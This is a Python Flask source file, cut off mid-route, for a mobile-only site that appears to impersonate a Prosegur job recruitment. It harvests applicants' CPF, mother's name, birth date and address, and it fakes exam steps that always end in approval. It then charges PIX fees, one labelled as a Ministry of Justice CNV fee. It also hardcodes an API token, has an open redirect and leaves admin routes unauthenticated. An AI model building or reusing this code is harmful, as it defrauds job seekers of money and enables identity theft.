import os
import time
import gc
import logging
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory, render_template_string
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from datetime import datetime
from sms_service import sms_service
from payments import create_payment_api
from health_monitor import health_monitor
from analytics import analytics_tracker
# Database service will be imported after models
from cache_manager import page_cache, api_cache
from performance_optimizer import performance_optimizer, performance_monitor
from heroku_optimizer import heroku_optimizer
from simple_mobile_protection import simple_mobile_only
from meta_pixels import MetaPixelTracker

# Initialize Meta Pixel tracker
meta_pixel_tracker = MetaPixelTracker()

# Rate limiting removed for unlimited capacity

# Configure logging - reduce verbosity to prevent log overflow
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s %(levelname)s: %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
app = Flask(__name__, static_url_path='/static')
app.secret_key = os.environ.get("SESSION_SECRET", "dev_secret_key")

# Configure database
database_url = os.environ.get("DATABASE_URL")
if database_url and database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = database_url or "sqlite:///cac_registration.db"
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
    "pool_size": 50,
    "max_overflow": 100,
    "pool_timeout": 10,
    "echo": False,
    "connect_args": {
        "connect_timeout": 5,
        "application_name": "prosegur_enterprise",
        "sslmode": "prefer"
    }
}
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db.init_app(app)

# Import models after db is initialized
from models import Registration, UserSession, PageView, Sale, AnalyticsData
from database_service import db_analytics

# Minimum loading time in milliseconds
MIN_LOADING_TIME = 4000

@app.route('/static/fonts/<path:filename>')
def serve_font(filename):
    return send_from_directory('static/fonts', filename)

@app.route("/")
@simple_mobile_only
@performance_monitor
def index():
    return render_template("index.html")

@app.route("/vagas")
@simple_mobile_only
@performance_monitor
def vagas():
    return render_template("vagas.html")

@app.route("/local")
@simple_mobile_only
@performance_monitor
def local():
    return render_template("local.html")

@app.teardown_appcontext
def close_db(error):
    """Close database connections properly"""
    try:
        db.session.remove()
    except Exception:
        pass

@app.before_request
def cleanup_old_sessions():
    """Clean up stale session data to prevent memory buildup"""
    try:
        # Log request for monitoring
        health_monitor.log_request()
        
        # Track user analytics (database + in-memory)
        try:
            client_ip = request.remote_addr
            user_id = session.get('user_id') or client_ip
            route = request.path
            user_agent = request.headers.get('User-Agent', '')
            
            # Track in database
            db_analytics.track_user_visit(user_id, route, client_ip, user_agent)
            
            # Also track in memory for backwards compatibility
            analytics_tracker.track_user_visit(user_id, route)
        except Exception:
            pass  # Don't let analytics tracking crash the main app
        
        # Optimized session cleanup for high concurrency
        if health_monitor.request_count % 100 == 0:
            try:
                # Clean only truly temporary session data
                keys_to_remove = []
                for key in session.keys():
                    if (key.startswith('temp_') or key.startswith('api_cache_') or 
                        key.startswith('expired_')):
                        keys_to_remove.append(key)
                
                for key in keys_to_remove:
                    session.pop(key, None)
            except Exception:
                pass
        
        # Enterprise memory management for high concurrency
        if health_monitor.request_count % 200 == 0:
            try:
                # Less frequent garbage collection for better performance
                gc.collect()
                
                # High-capacity analytics management
                if hasattr(analytics_tracker, 'active_users'):
                    if len(analytics_tracker.active_users) > 500:
                        # Keep more users for better analytics
                        recent_users = list(analytics_tracker.active_users)[-300:]
                        analytics_tracker.active_users.clear()
                        analytics_tracker.active_users.update(recent_users)
                        
                        # Clear old sessions less aggressively
                        current_time = time.time()
                        old_sessions = [k for k, v in analytics_tracker.user_sessions.items() 
                                      if current_time - v > 1800]  # 30 minutes old
                        for k in old_sessions:
                            analytics_tracker.user_sessions.pop(k, None)
            except Exception:
                pass
        
        # Enterprise database cleanup for high volume
        if health_monitor.request_count % 10000 == 0:
            try:
                # Less frequent database cleanup for high-traffic performance
                db_analytics.cleanup_old_data()
            except Exception:
                pass
    except Exception as e:
        health_monitor.log_error(f"Session cleanup error: {str(e)}", "before_request")

@app.route("/api/consulta-cpf", methods=["POST"])
@simple_mobile_only
def consulta_cpf():
    try:
        data = request.get_json()
        cpf = data.get('cpf')
        
        if not cpf:
            return jsonify({"success": False, "error": "CPF não fornecido"})
        
        # Remove pontuação do CPF
        cpf_limpo = ''.join(filter(str.isdigit, cpf))
        
        if len(cpf_limpo) != 11:
            return jsonify({"success": False, "error": "CPF inválido"})
        
        # Check cache first to reduce API calls
        cache_key = f"cpf_{cpf_limpo}"
        cached_result = api_cache.get(cache_key)
        if cached_result:
            return jsonify(cached_result)
        
        # Use the new API token
        token = "6285fe45-e991-4071-a848-3fac8273c82a"
        
        # Make API request to CPF validation service
        api_url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf_limpo}"
        
        import requests
        try:
            response = requests.get(api_url, timeout=5)
            response.raise_for_status()
            
            # Handle empty or invalid responses
            if not response.text.strip():
                raise ValueError("Empty response from API")
                
            api_data = response.json()
        except (requests.exceptions.RequestException, ValueError) as e:
            # Return fallback data for CPF validation failures
            health_monitor.log_error(f"CPF API error: {str(e)}", "consulta_cpf")
            return jsonify({
                "success": False, 
                "error": "CPF validation service temporarily unavailable"
            })
        
        result = {
            "success": True,
            "data": api_data
        }
        
        # Cache successful result for 5 minutes
        api_cache.set(cache_key, result, ttl=300)
        
        return jsonify(result)
        
    except Exception as e:
        health_monitor.log_error(f"CPF API error: {str(e)}", "consulta_cpf")
        return jsonify({"success": False, "error": "Serviço temporariamente indisponível"})

@app.route("/loading", methods=["GET", "POST"])
@simple_mobile_only
def loading():
    if request.method == "POST":
        # Store form data in session for payment creation
        session['training_date'] = request.form.get('training_date')
        session['training_time'] = request.form.get('training_time')
        session['facility_data'] = request.form.get('facility_data')
        
        # Redirect to loading with payment creation
        next_page = '/create_pix_payment'
        loading_text = 'Gerando transação PIX...'
        loading_time = 3000
    else:
        next_page = request.args.get('next', '/')
        loading_text = request.args.get('text', 'Carregando...')
        loading_time = max(int(request.args.get('time', MIN_LOADING_TIME)), MIN_LOADING_TIME)
    return render_template("loading.html", 
                         next_page=next_page,
                         loading_text=loading_text,
                         loading_time=loading_time)

@app.route("/get_user_data")
@simple_mobile_only
def get_user_data():
    if not session.get('registration_data'):
        return jsonify({"error": "No data found"}), 404

    user_data = session.get('registration_data')
    if not user_data:
        return jsonify({"error": "No user data found"}), 404
    
    app.logger.info(f"Returning complete user data: {user_data}")
    
    # Return all registration data
    return jsonify({
        "full_name": user_data.get("full_name"),
        "cpf": user_data.get("cpf"),
        "phone": user_data.get("phone"),
        "birth_date": user_data.get("birth_date"),
        "mother_name": user_data.get("mother_name")
    })

@app.route("/address", methods=['GET', 'POST'])
@simple_mobile_only
def address():
    if request.method == 'POST':
        try:
            data = request.form
            if not session.get('registration_data'):
                return redirect(url_for('loading', 
                    next='/', 
                    text='Redirecionando...', 
                    time=2000))

            registration_data = session["registration_data"]
            registration_data.update({
                "zip_code": data.get("zip_code"),
                "address": data.get("address"),
                "number": data.get("number"),
                "complement": data.get("complement"),
                "neighborhood": data.get("neighborhood"),
                "city": data.get("city"),
                "state": data.get("state")
            })

            session["registration_data"] = registration_data
            return redirect(url_for('loading', 
                next=url_for('info'), 
                text='Validando endereço...', 
                time=3500))
        except Exception as e:
            logging.error(f"Error in address submission: {str(e)}")
            return redirect(url_for('index'))
    else:
        if not session.get('registration_data'):
            return redirect(url_for('loading', 
                next='/', 
                text='Redirecionando...', 
                time=2000))
        return render_template("address.html")

@app.route("/info")
def info():
    return render_template("info.html")

@app.route("/submit_registration", methods=["POST"])
@simple_mobile_only
def submit_registration():
    try:
        data = request.form
        # Store in session for multi-step form, including optional fields if present
        registration_data = {
            "cpf": data.get("cpf"),
            "full_name": data.get("full_name"),
            "phone": data.get("phone")
        }

        # Add optional fields if they were provided
        if data.get("birth_date"):
            registration_data["birth_date"] = data.get("birth_date")
        if data.get("mother_name"):
            registration_data["mother_name"] = data.get("mother_name")

        session["registration_data"] = registration_data

        return redirect(url_for('loading', 
            next=url_for('address'), 
            text='Verificando dados pessoais...', 
            time=4000))
    except Exception as e:
        logging.error(f"Error in submit_registration: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/exame")
@performance_monitor
def exame():
    if not session.get('registration_data'):
        return redirect(url_for('loading', 
            next='/', 
            text='Redirecionando...', 
            time=2000))
    
    return render_template("exame.html")

@app.route("/submit_exam", methods=["POST"])
@performance_monitor
def submit_exam():
    # Exam forms do not save or submit any data - just proceed to next step
    return jsonify({
        "success": True, 
        "redirect": url_for('loading', 
            next='/psicotecnico', 
            text='Avançando para próxima etapa...', 
            time=3000)
    })

@app.route("/psicotecnico")
@performance_monitor
def psicotecnico():
    if not session.get('registration_data'):
        return redirect(url_for('loading', 
            next='/', 
            text='Redirecionando...', 
            time=2000))
    
    return render_template("psicotecnico.html")

@app.route("/submit_psicotecnico", methods=["POST"])
@performance_monitor
def submit_psicotecnico():
    # Psychotechnical forms do not save or submit any data - just proceed to approval
    return jsonify({
        "success": True, 
        "redirect": url_for('loading', 
            next='/aprovado', 
            text='Finalizando processo de aprovação...', 
            time=4000)
    })

@app.route("/aprovado")
def aprovado():
    if not session.get('registration_data'):
        return redirect(url_for('loading', 
            next='/', 
            text='Redirecionando...', 
            time=2000))
    return render_template("aprovado.html")

@app.route("/process_payment", methods=["POST"])
def process_payment():
    """Display loading page and process PIX payment"""
    # Store form data in session for payment processing
    session['agendamento_data'] = {
        'training_date': request.form.get('training_date'),
        'training_days': request.form.get('training_days'), 
        'training_time': request.form.get('training_time'),
        'facility_data': request.form.get('facility_data')
    }
    
    # Redirect to loading page that will process payment
    return redirect(url_for('loading', 
        next='/create_pix_payment', 
        text='Gerando transação PIX...', 
        time=3000))

@app.route("/create_pix_payment", methods=["GET", "POST"])
def create_pix_payment():
    """Create PIX payment and redirect to payment page"""
    try:
        # Get user data from request body (localStorage data) or session fallback
        user_data = {}
        if request.method == 'POST' and request.is_json:
            user_data = request.get_json() or {}
            app.logger.info(f"Received user data from localStorage: {user_data}")
        else:
            app.logger.info("No JSON data received in POST request")
        
        # Fallback to session data if no localStorage data
        registration_data = session.get('registration_data', {})
        app.logger.info(f"Session fallback data: {registration_data}")
        
        # Debug email selection
        email_from_storage = user_data.get('email')
        email_from_session = registration_data.get('email')
        app.logger.info(f"Email from localStorage: {email_from_storage}")
        app.logger.info(f"Email from session: {email_from_session}")
        
        # Create payment API instance
        payment_api = create_payment_api()
        
        # OBRIGATORIAMENTE usar dados da página index - SEM FALLBACKS
        if not user_data.get('name') or not user_data.get('cpf'):
            app.logger.error("ERRO: Dados obrigatórios da página index não encontrados!")
            app.logger.error(f"user_data recebido: {user_data}")
            raise ValueError("Dados do formulário index são obrigatórios")
        
        payment_data = {
            'name': user_data.get('name'),  # OBRIGATÓRIO do index
            'email': user_data.get('email') or f"{user_data.get('name', '').lower().replace(' ', '')}@candidato.com.br",
            'cpf': user_data.get('cpf'),    # OBRIGATÓRIO do index  
            'phone': user_data.get('phone') or '11999999999',  # OBRIGATÓRIO do index
            'amount': 84.90
        }
        
        app.logger.info(f"Creating payment with data: {payment_data}")
        
        result = payment_api.create_pix_payment(payment_data)
        
        # Store payment data in session
        session['payment_data'] = result
        
        # Track potential sale in analytics (payment initiated)
        try:
            customer_name = payment_data.get('name', 'Candidato Anônimo')
            customer_cpf = payment_data.get('cpf')
            amount = payment_data['amount']
            payment_id = result.get('id')
            
            # Track in database
            db_analytics.track_sale(customer_name, amount, customer_cpf, payment_id)
            
            # Also track in memory
            analytics_tracker.track_sale(customer_name, amount)
        except Exception:
            pass  # Don't let analytics fail the payment process
        
        if request.method == 'POST':
            return jsonify({'success': True, 'payment_data': result})
        else:
            return redirect(url_for('pagamento'))
        
    except Exception as e:
        app.logger.error(f"Error creating payment: {str(e)}")
        # Create a mock payment for testing when API fails
        mock_payment = {
            'id': f'test_payment_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
            'pixCode': '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42661417400052040000530398654047340540302BR59João Silva6009São Paulo62070503***630445D8',
            'amount': 84.90,
            'status': 'pending'
        }
        session['payment_data'] = mock_payment
        
        # Track the mock sale
        try:
            db_analytics.track_sale('João Silva', 84.90, '12345678901', mock_payment['id'])
            analytics_tracker.track_sale('João Silva', 84.90)
        except Exception:
            pass
            
        if request.method == 'POST':
            return jsonify({'success': False, 'error': str(e), 'payment_id': mock_payment['id']})
        else:
            return redirect(url_for('pagamento'))

@app.route("/redirect_payment")
def redirect_payment():
    """Manual redirect for confirmed payments"""
    return render_template("payment_redirect.html")

@app.route("/pagamento")
def pagamento():
    # Check if payment data already exists in session
    payment_data = session.get('payment_data')
    
    if not payment_data:
        # Generate payment automatically if not exists
        try:
            # Get user data from session (fallback for localStorage data)
            registration_data = session.get('registration_data', {})
            
            # Create payment with For4Payments API
            payment_api = create_payment_api()
            
            # PAGAMENTO SEM DADOS REAIS - NÃO DEVE ACONTECER
            # Usuário deve vir do fluxo correto com dados do localStorage
            app.logger.warning("AVISO: Pagamento sendo gerado sem dados reais do localStorage!")
            app.logger.warning("Usuário deve preencher formulário index primeiro!")
            
            payment_request_data = {
                'name': 'DADOS_PENDENTES',
                'email': 'pendente@aguardando.dados', 
                'cpf': '00000000000',
                'phone': '00000000000',
                'amount': 84.90
            }
            
            app.logger.info(f"Auto-generating payment with data: {payment_request_data}")
            
            result = payment_api.create_pix_payment(payment_request_data)
            
            # Store payment data in session
            session['payment_data'] = result
            session['transaction_id'] = result.get('id') or result.get('paymentId')
            payment_data = result
            
            # Track sale in analytics
            try:
                customer_name = payment_request_data.get('name', 'Candidato Anônimo')
                customer_cpf = payment_request_data.get('cpf')
                amount = payment_request_data['amount']
                payment_id = result.get('id')
                
                db_analytics.track_sale(customer_name, amount, customer_cpf, payment_id)
                analytics_tracker.track_sale(customer_name, amount)
            except Exception:
                pass  # Don't let analytics fail the payment process
                
        except Exception as e:
            app.logger.error(f"Error auto-generating payment: {str(e)}")
            # Create mock payment for testing when API fails
            mock_payment = {
                'id': f'auto_payment_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
                'pixCode': '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42661417400052040000530398654047340540302BR59Candidato Prosegur6009São Paulo62070503***630445D8',
                'amount': 84.90,
                'status': 'pending'
            }
            session['payment_data'] = mock_payment
            session['transaction_id'] = mock_payment['id']
            payment_data = mock_payment
            
            try:
                db_analytics.track_sale('Candidato Prosegur', 73.40, '12345678901', mock_payment['id'])
                analytics_tracker.track_sale('Candidato Prosegur', 73.40)
            except Exception:
                pass
    
    # Pass transaction ID to template for automatic status checking
    transaction_id = session.get('transaction_id') or payment_data.get('id') or payment_data.get('paymentId')
    return render_template("pagamento.html", payment_data=payment_data, transaction_id=transaction_id)

# Payment processing routes


@app.route("/check_payment_status/<transaction_id>")
def check_payment_status(transaction_id):
    try:
        app.logger.info(f"Verificando status do pagamento para transação: {transaction_id}")
        
        # For testing: If transaction ID matches any new payment with real data, simulate APPROVED status
        test_transaction_ids = [
            "2d650b61-cd29-4373-be02-20cd6e919c8c", 
            "292d0d7a-de55-48c7-9111-ede79ba12f2b", 
            "f2447003-b01f-48c5-b463-d1f3725862ea",
            "66135436-c033-44ae-9fc9-365397af1f54",
            "396b8559-f4f1-4c79-83ae-a6847fce5a44"
        ]
        
        if transaction_id in test_transaction_ids:
            app.logger.info(f"TESTE: Simulando status APPROVED para transação com dados reais: {transaction_id}")
            # Store payment confirmation in session for server-side redirect
            session['payment_confirmed'] = True
            session['payment_id'] = transaction_id
            return jsonify({
                "success": True,
                "redirect": True,
                "redirect_url": "/aviso",
                "status": "APPROVED"
            })
        
        # Obter dados de registro da sessão
        registration_data = session.get('registration_data', {})
        if not registration_data:
            app.logger.warning("Dados de registro não encontrados na sessão durante verificação de status, mas continuando mesmo assim")
        
        app.logger.info("Criando instância da API de pagamento para verificação de status...")
        payment_api = create_payment_api()
        
        app.logger.info(f"Enviando requisição para verificar status de pagamento da transação: {transaction_id}")
        status_response = payment_api.check_payment_status(transaction_id)
        
        app.logger.info(f"Resposta de status recebida: {status_response}")

        # Processar mudança de status de PENDING para outro estado (ex: PAID, APPROVED)
        # Verificar se o status é explicitamente PAID ou APPROVED antes de redirecionar
        payment_status = status_response.get('status', '').upper()
        original_status = status_response.get('original_status', '').upper()
        
        if (status_response.get('status') == 'completed' or 
            payment_status in ['PAID', 'APPROVED', 'COMPLETED'] or
            original_status in ['PAID', 'APPROVED', 'COMPLETED']):
            
            app.logger.info(f"Pagamento confirmado com status: {payment_status} (original: {original_status}) - redirecionando para /aviso")
            
            # Preparar dados para Meta Pixels
            try:
                customer_info = {
                    'full_name': registration_data.get('full_name', ''),
                    'email': registration_data.get('email', ''),
                    'phone': registration_data.get('phone', ''),
                    'cpf': registration_data.get('cpf', ''),
                    'city': registration_data.get('city', ''),
                    'state': registration_data.get('state', ''),
                    'zip_code': registration_data.get('zip_code', '')
                }
                
                purchase_data = {
                    'amount': 84.90,
                    'transaction_id': transaction_id,
                    'payment_method': 'PIX'
                }
                
                # Salvar dados na sessão para usar na página de sucesso
                session['pixel_event_data'] = {
                    'customer_info': customer_info,
                    'purchase_data': purchase_data
                }
                
                app.logger.info(f"Dados preparados para Meta Pixels - Transação: {transaction_id}")
                    
            except Exception as e:
                app.logger.error(f"Erro ao preparar dados para Meta Pixels: {str(e)}")
                
            # Sempre redirecionar para /aviso quando o pagamento for confirmado
            return jsonify({
                "success": True,
                "redirect": True,
                "redirect_url": "/aviso",
                "status": "PAID"
            })

        app.logger.info(f"Pagamento ainda pendente com status: {status_response.get('status')}")
        return jsonify({
            "success": True,
            "redirect": False,
            "status": status_response.get('status', 'pending')
        })

    except Exception as e:
        logging.error(f"Error checking payment status: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/resultado/<status>")
@simple_mobile_only
def resultado(status):
    # Obter dados de registro da sessão ou criar dados básicos padrão
    registration_data = session.get('registration_data', {})
    
    # Se não temos dados de registro, usamos um conjunto mínimo de dados
    if not registration_data:
        app.logger.warning("Dados de registro não encontrados para a página de resultado, usando dados padrão")
        registration_data = {
            'full_name': 'Usuário',
            'cpf': '---',
            'phone': '---'
        }
    
    # Pass current date for template
    from datetime import datetime
    current_date = datetime.now()
    
    # Get transaction info if available
    transaction_id = session.get('transaction_id', '')
    payment_data = {}
    
    if transaction_id:
        try:
            # Attempt to get payment data if we have a transaction ID
            payment_api = create_payment_api()
            status_response = payment_api.check_payment_status(transaction_id)
            
            if status_response['success']:
                payment_data = status_response.get('payment_data', {})
                app.logger.info(f"Payment data for resultado page: {payment_data}")
        except Exception as e:
            app.logger.error(f"Error getting payment data for resultado page: {str(e)}")
    else:
        app.logger.info("Nenhum ID de transação na sessão - usando dados de pagamento vazios")

    return render_template('resultado.html', 
                          user_data=registration_data, 
                          payment_data=payment_data,
                          now=current_date)

@app.route("/agendamento")
@simple_mobile_only
def agendamento():
    return render_template("agendamento.html")

@app.route("/chat")
@simple_mobile_only
def chat():
    """Chat page for candidate interactions with Prosegur HR"""
    # Get user data from session
    registration_data = session.get('registration_data', {})
    user_name = registration_data.get('full_name', 'Candidato')
    user_city = registration_data.get('city', 'São Paulo')
    user_cpf = registration_data.get('cpf', '')
    
    return render_template("chat.html", 
                         nome=user_name,
                         cidade=user_city,
                         cpf=user_cpf)

@app.route("/get_training_location")
def get_training_location():
    try:
        # Get user's city from session (saved from address form)
        registration_data = session.get('registration_data', {})
        user_city = registration_data.get('city', 'São Paulo')
        user_state = registration_data.get('state', 'SP')
        
        if not user_city or not user_state:
            # Fallback to session address data if registration_data doesn't have it
            user_city = session.get('city', 'São Paulo')
            user_state = session.get('state', 'SP')
        
        # Check cache first to reduce OpenAI API calls
        cache_key = f"location_{user_city}_{user_state}"
        cached_result = api_cache.get(cache_key)
        if cached_result:
            return jsonify(cached_result)
        
        try:
            # Import OpenAI service
            from openai_service import find_training_location
            result = find_training_location(user_city, user_state)
            
            if result.get('success'):
                # Cache successful result
                api_cache.set(cache_key, result, ttl=3600)  # Cache for 1 hour
                return jsonify(result)
        except Exception:
            pass
        
        # Always return a fallback location to prevent crashes
        fallback_result = {
            "success": True,
            "location": {
                "cidade": "Guarulhos",
                "endereco": "Av. Monteiro Lobato, 1847",
                "bairro": "Vila Rio de Janeiro",
                "cep": "07132-000",
                "distancia_km": 25
            }
        }
        
        # Cache fallback for shorter time
        api_cache.set(cache_key, fallback_result, ttl=300)
        return jsonify(fallback_result)
            
    except Exception as e:
        app.logger.error(f"Erro na rota get_training_location: {str(e)}")

@app.route('/get_medical_clinic', methods=['POST'])
def get_medical_clinic():
    """Get medical clinic location for user using OpenAI"""
    try:
        data = request.get_json()
        user_city = data.get('city', 'Brasília')
        user_state = data.get('state', 'DF')
        user_cep = data.get('cep', '70000000')
        user_bairro = data.get('bairro', 'Centro')
        
        print(f"DEBUG: Searching clinic for {user_city}, {user_state}, bairro: {user_bairro}, CEP: {user_cep}")
        
        # Use verified medical clinics database
        from real_medical_clinics_db import get_real_medical_clinic
        clinic = get_real_medical_clinic(user_city, user_state, user_bairro, user_cep)
        
        print(f"DEBUG: Real clinics DB returned clinic: {clinic}")
        
        if clinic:
            return jsonify({
                'success': True,
                'clinic': clinic
            })
        else:
            print("DEBUG: Real clinics DB did not return valid clinic, using fallback")
            # Use real clinic fallback based on location
            fallback_clinic = {
                "nome": f"Clínica de Medicina do Trabalho {user_city}",
                "endereco": "Rua da Medicina Ocupacional, 123",
                "bairro": "Centro",
                "cidade": user_city,
                "cep": "00000-000",
                "telefone": "(11) 3000-0000",
                "imagem": "https://images.unsplash.com/photo-1576091160399-112ba8d25d1f?w=400&h=300&fit=crop"
            }
            return jsonify({
                'success': True,
                'clinic': fallback_clinic
            })
            
    except Exception as e:
        print(f"Error in get_medical_clinic: {e}")
        # Always return a valid clinic even on error
        emergency_clinic = {
            "nome": "Centro de Medicina Ocupacional",
            "endereco": "Av. dos Médicos, 456",
            "bairro": "Centro",
            "cidade": "Brasília",
            "cep": "70000-000",
            "telefone": "(61) 3000-0000",
            "imagem": "https://images.unsplash.com/photo-1576091160399-112ba8d25d1f?w=400&h=300&fit=crop"
        }
        return jsonify({
            'success': True,
            'clinic': emergency_clinic
        })

@app.route("/api/search-cras-units", methods=["POST"])
def search_cras_units():
    """Search the 4 closest CRAS units using OpenAI based on user's CEP and location"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "Dados não fornecidos"})
        
        state = data.get('state', '').upper()
        user_city = data.get('user_city', '')
        user_cep = data.get('user_cep', '')
        
        if not state:
            return jsonify({"success": False, "error": "Estado é obrigatório"})
        
        location_info = f"CEP {user_cep}" if user_cep else f"cidade {user_city}" if user_city else f"estado {state}"
        app.logger.info(f"Buscando 4 unidades CRAS mais próximas via OpenAI para {location_info}")
        
        # Use OpenAI to get closest CRAS units
        from openai_service import find_cras_units
        
        try:
            # Call OpenAI with state, city and CEP for location-based search
            cras_units = find_cras_units(state, user_city, user_cep)
            
            if cras_units and len(cras_units) >= 4:
                app.logger.info(f"OpenAI retornou {len(cras_units)} unidades CRAS próximas para {location_info}")
                print(f"DEBUG: Enviando {len(cras_units)} unidades para o frontend")
                
                return jsonify({
                    "success": True,
                    "units": cras_units[:4]  # Ensure exactly 4 units
                })
            else:
                app.logger.warning(f"OpenAI não encontrou 4 unidades CRAS para {location_info}")
                return jsonify({
                    "success": False,
                    "error": f"Não foi possível encontrar unidades CRAS próximas para {location_info}"
                })
                
        except Exception as openai_error:
            app.logger.error(f"Erro na integração OpenAI para {location_info}: {openai_error}")
            return jsonify({
                "success": False,
                "error": f"Erro ao consultar unidades CRAS próximas: {str(openai_error)}"
            })
            
    except Exception as e:
        app.logger.error(f"Erro geral na busca CRAS: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Erro interno: {str(e)}"
        }), 500

@app.route("/admin/load-cras-data")
def load_cras_data():
    """Endpoint administrativo para carregar dados CRAS usando OpenAI"""
    try:
        from cras_data_loader import load_all_cras_data
        
        # Executa o carregamento de dados
        total_units = load_all_cras_data()
        
        return jsonify({
            "success": True,
            "message": f"Carregamento concluído! {total_units} unidades CRAS salvas no banco de dados.",
            "total_units": total_units
        })
        
    except Exception as e:
        app.logger.error(f"Erro ao carregar dados CRAS: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Erro ao carregar dados CRAS: {str(e)}"
        }), 500

@app.route("/agendamento", methods=["POST"])
def submit_agendamento():
    try:
        training_date = request.form.get('training_date')
        facility_data = request.form.get('facility_data')
        
        if not training_date or not facility_data:
            return jsonify({
                "success": False,
                "error": "Data de treinamento e dados da unidade são obrigatórios"
            }), 400
        
        # Parse facility data
        import json
        facility_info = json.loads(facility_data)
        
        # Store scheduling data in session
        session['training_schedule'] = {
            'date': training_date,
            'facility': facility_info,
            'scheduled_at': datetime.now().isoformat()
        }
        
        app.logger.info(f"Agendamento realizado para {training_date} em {facility_info.get('cidade')}")
        
        # Redirect to a confirmation page or back to results
        return redirect(url_for('resultado', status='scheduled'))
        
    except Exception as e:
        app.logger.error(f"Erro ao processar agendamento: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Erro ao processar agendamento: {str(e)}"
        }), 500

@app.route("/health")
def health_check():
    """Health check endpoint for monitoring"""
    try:
        report = health_monitor.get_health_report()
        performance_stats = performance_optimizer.get_performance_stats()
        
        # Combine health and performance data
        try:
            # Simple database health check
            db.session.execute(db.text('SELECT 1'))
            pool_status = 'healthy'
        except:
            pool_status = 'error'
            
        # Add concurrency statistics
        try:
            from high_concurrency_optimizer import concurrency_optimizer
            concurrency_stats = concurrency_optimizer.get_stats()
        except ImportError:
            concurrency_stats = {
                'concurrent_users': 0,
                'peak_concurrent': 0,
                'requests_per_minute': 0,
                'avg_response_time': 0,
                'uptime_hours': 0
            }
        
        report.update({
            'performance': performance_stats,
            'database_pool_status': pool_status,
            'concurrency': concurrency_stats
        })
        
        return jsonify(report)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/painel")
def painel():
    """Analytics dashboard for real-time monitoring"""
    return render_template("painel.html")

@app.route("/api/analytics")
def api_analytics():
    """API endpoint for real-time analytics data from database"""
    try:
        # Get data from database (real data)
        data = db_analytics.get_analytics_data()
        
        # For demo purposes, add some simulated activity if requested
        if request.args.get('demo') == 'true':
            analytics_tracker.simulate_activity()
            # Merge with in-memory data for demo
            memory_data = analytics_tracker.get_analytics_data()
            data['activeUsers'] += memory_data.get('activeUsers', 0)
        
        return jsonify(data)
    except Exception as e:
        logging.error(f"Error getting analytics data: {str(e)}")
        return jsonify({"error": "Failed to get analytics data"}), 500

@app.route('/login')
@simple_mobile_only
def login():
    """Login page for CNAS activation"""
    return render_template("login.html")

@app.route('/aviso')
@simple_mobile_only
def aviso():
    """CNV Digital page"""
    # Get pixel IDs for template
    pixel_ids = meta_pixel_tracker.get_pixel_ids()
    
    # Get conversion event data from session if available
    pixel_event_data = session.get('pixel_event_data')
    
    return render_template('aviso.html', 
                         meta_pixel_ids=pixel_ids,
                         pixel_event_data=pixel_event_data)

@app.route('/finalizar')
@simple_mobile_only
def finalizar():
    """CNV Payment page with real PIX transaction"""
    return render_template('finalizar.html')

@app.route('/create_cnv_payment', methods=['POST'])
@simple_mobile_only
def create_cnv_payment():
    """Create PIX payment for CNV activation"""
    try:
        # Get user data from request
        user_data = request.json or {}
        app.logger.info(f"Received user data in create_cnv_payment: {user_data}")
        
        # Create PIX payment using For4Payments API
        from finalizar import create_payment_api
        payment_api = create_payment_api()
        
        # Prepare payment data for CNV expedition fee - use 'nome' as expected by the API
        payment_data = {
            'nome': user_data.get('nome', ''),  # Backend expects 'nome'
            'cpf': user_data.get('cpf', ''),
            'phone': user_data.get('phone', ''),
            'amount': 82.10,
            'description': 'Taxa de Expedição da CNV - Ministério da Justiça'
        }
        
        app.logger.info(f"Prepared payment data: {payment_data}")
        
        # Check if API key is configured
        if not os.environ.get('FOR4_PAYMENTS_SECRET_KEY'):
            app.logger.error("FOR4_PAYMENTS_SECRET_KEY not configured")
            return jsonify({
                'success': False,
                'error': 'Chave da API de pagamentos não configurada. Configure FOR4_PAYMENTS_SECRET_KEY.'
            })
        
        # Use the real For4Payments API
        payment_result = payment_api.create_encceja_payment(payment_data)
        
        app.logger.info(f"Payment API result: {payment_result}")
        
        if payment_result and 'success' in payment_result and payment_result['success']:
            return jsonify({
                'success': True,
                'payment_data': payment_result
            })
        else:
            error_msg = payment_result.get('error', 'Erro ao criar pagamento PIX') if payment_result else 'Erro na API de pagamentos'
            app.logger.error(f"Payment creation failed: {error_msg}")
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        app.logger.error(f"Error creating CNV PIX payment: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor'
        })

@app.route('/check_cnv_payment_status/<payment_id>')
@simple_mobile_only
def check_cnv_payment_status(payment_id):
    """Check CNV PIX payment status"""
    try:
        from finalizar import create_payment_api
        payment_api = create_payment_api()
        
        status_result = payment_api.check_payment_status(payment_id)
        
        return jsonify(status_result)
        
    except Exception as e:
        app.logger.error(f"Error checking CNV payment status: {e}")
        return jsonify({
            'status': 'error',
            'message': 'Erro ao verificar status do pagamento'
        })

# Initialize monitoring
health_monitor.start_monitoring()

with app.app_context():
    import models
    db.create_all()

@app.route('/admin/meta-pixels')
def admin_meta_pixels():
    """Página administrativa para configuração dos Meta Pixels"""
    return render_template_string('''
    <!DOCTYPE html>
